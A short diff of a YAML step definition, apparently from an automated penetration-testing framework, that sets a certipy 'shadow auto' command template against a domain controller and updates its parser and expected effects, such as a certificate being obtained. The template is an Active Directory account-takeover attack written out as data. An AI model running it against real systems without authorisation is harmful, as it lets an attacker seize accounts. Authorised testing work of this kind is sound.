@@ -8,9 +8,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: certipy shadow auto -u '{username}@{domain}' -p '{password}' -account
   '{target_user}' -dc-ip {target_ip}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- adcs_findings
+- certificate_obtained
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
